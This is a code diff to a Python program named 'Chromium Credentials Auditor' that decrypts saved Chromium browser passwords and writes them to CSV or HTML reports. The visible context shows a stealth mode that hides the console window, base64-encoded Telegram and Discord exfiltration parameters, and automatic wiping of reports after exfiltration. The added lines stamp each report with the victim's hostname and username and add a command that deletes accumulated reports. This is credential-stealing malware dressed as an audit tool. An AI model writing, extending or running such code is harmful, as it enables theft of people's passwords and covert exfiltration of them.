@@ -3,6 +3,8 @@ import sys
 import json
 import html
 import base64
+import socket
+import getpass
 import importlib
 import sqlite3
 import shutil
@@ -119,7 +121,16 @@ HTML_TEMPLATE = """
 <body>
     <div class="container">
         <h1>Auditoría de Credenciales Chromium</h1>
-        <p>Generado el: {{date}} | Total: {{total}} credenciales</p>
+        <div style="background:#f8f9fa; border-left:4px solid #3498db; padding:12px 16px; margin-bottom:16px; font-size:0.92em; border-radius:0 4px 4px 0;">
+            <strong>Metadatos del Reporte</strong><br>
+            Fecha: <b>{{date}}</b> &nbsp;|&nbsp;
+            Host: <b>{{hostname}}</b> &nbsp;|&nbsp;
+            Usuario: <b>{{username}}</b> &nbsp;|&nbsp;
+            PID: <b>{{pid}}</b> &nbsp;|&nbsp;
+            Versión: <b>{{version}}</b><br>
+            Credenciales válidas: <b>{{total}}</b> &nbsp;|&nbsp;
+            Filtradas (no-HTTP): <b>{{filtered_count}}</b>
+        </div>
         <table>
             <thead>
                 <tr>
@@ -328,17 +339,30 @@ class ChromiumDecryptor:
             logger.info("No se encontraron credenciales.")
             return 0, None
 
-        stamp     = datetime.now().strftime("%Y%m%d_%H%M%S")
-        base_out  = OUTPUT_DIR / f"{out}.{fmt}"
-        final_out = OUTPUT_DIR / f"{out}_{stamp}.{fmt}" if base_out.exists() else base_out
+        stamp      = datetime.now().strftime("%Y%m%d_%H%M%S")
+        base_out   = OUTPUT_DIR / f"{out}.{fmt}"
+        final_out  = OUTPUT_DIR / f"{out}_{stamp}.{fmt}" if base_out.exists() else base_out
         if final_out != base_out:
             logger.info(f"Archivo existente. Guardando como: {final_out.name}")
 
-        skipped_note = f" · {skipped} entradas no-http descartadas" if skipped else ""
+        skipped_note  = f" · {skipped} entradas no-http descartadas" if skipped else ""
+        hostname      = socket.gethostname()
+        username      = getpass.getuser()
+        date_readable = (stamp[:4] + "-" + stamp[4:6] + "-" + stamp[6:8]
+                         + " " + stamp[9:11] + ":" + stamp[11:13])
 
         if fmt == "csv":
             with open(final_out, 'w', newline='', encoding='utf-8') as f:
                 w = csv.writer(f)
+                # Metadata header rows (prefixed with # for easy parsing)
+                w.writerow(["# Reporte Chromium Credentials Auditor"])
+                w.writerow([f"# Fecha: {date_readable}"])
+                w.writerow([f"# Host: {hostname}"])
+                w.writerow([f"# Usuario: {username}"])
+                w.writerow([f"# PID: {_PID}"])
+                w.writerow([f"# Version: {__version__}"])
+                w.writerow([f"# Total validos: {len(data)} | Filtrados: {skipped}"])
+                w.writerow([])  # blank separator
                 w.writerow(["Browser", "Profile", "URL", "User", "Pass"])
                 w.writerows(data)
 
@@ -383,8 +407,12 @@ class ChromiumDecryptor:
             # total y date se reemplazan ANTES que rows para evitar colisión con datos de usuario
             html_out = (HTML_TEMPLATE
                         .replace("{{total}}", str(len(data)))
-                        .replace("{{date}}", stamp[:4] + "-" + stamp[4:6] + "-" + stamp[6:8]
-                                 + " " + stamp[9:11] + ":" + stamp[11:13])
+                        .replace("{{filtered_count}}", str(skipped))
+                        .replace("{{date}}", date_readable)
+                        .replace("{{hostname}}", html.escape(hostname))
+                        .replace("{{username}}", html.escape(username))
+                        .replace("{{pid}}", str(_PID))
+                        .replace("{{version}}", html.escape(__version__))
                         .replace("{{skipped_note}}", skipped_note)
                         .replace("{{rows}}", rows_html)
                         .replace("{{filtered_section}}", filtered_section))
@@ -419,6 +447,8 @@ def main():
                         help="Modo sigiloso: oculta la ventana de consola (idéntico a .exe --noconsole).")
     parser.add_argument("--no-wipe", action="store_true",
                         help="Desactiva el auto-borrado del reporte tras exfiltración.")
+    parser.add_argument("--clean", action="store_true",
+                        help="Elimina todos los reportes acumulados en la carpeta de salida y sale.")
     parser.add_argument("-v", "--verbose", action="store_true",
                         help="Muestra logs detallados de depuración en consola.")
 
@@ -446,6 +476,20 @@ def main():
     token   = safe_b64_decode(args.telegram_token)
     chatid  = safe_b64_decode(args.telegram_chatid)
     discord = safe_b64_decode(args.discord)
+
+    if args.clean:
+        patterns = ["*.html", "*.csv"]
+        removed  = 0
+        for pat in patterns:
+            for f in OUTPUT_DIR.glob(pat):
+                try:
+                    f.unlink()
+                    removed += 1
+                    logger.info(f"Eliminado: {f.name}")
+                except OSError as e:
+                    logger.warning(f"No se pudo eliminar {f.name}: {e}")
+        logger.info(f"Limpieza completada: {removed} archivo(s) eliminado(s) de {OUTPUT_DIR}")
+        return
 
     logger.info("Iniciando Chromium Credentials Auditor Suite...")
 
